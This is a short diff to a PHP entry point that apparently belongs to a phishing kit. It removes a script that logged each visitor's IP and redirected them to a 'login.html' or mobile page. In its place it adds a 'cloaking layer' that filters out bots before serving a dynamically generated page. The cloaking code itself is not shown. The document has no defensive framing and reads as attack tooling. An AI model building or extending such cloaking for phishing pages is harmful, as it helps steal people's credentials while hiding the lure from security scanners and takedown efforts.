@@ -1,14 +1,10 @@
 <?php
-// Device detection - serve mobile or desktop version
-include 'ip.php'; // Log the visitor
+/**
+ * Entry point with cloaking layer
+ */
+require_once __DIR__ . '/../_cloak.php';
 
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$is_mobile = preg_match('/(android|iphone|ipad|ipod|blackberry|windows phone|opera mini|iemobile|mobile)/i', $user_agent);
-
-if ($is_mobile) {
-    header('Location: mobile.html');
-} else {
-    header('Location: login.html');
-}
-exit();
+// If we get here, the visitor passed all bot checks
+// Serve the dynamically generated page
+require_once 'cache.php';
 ?>
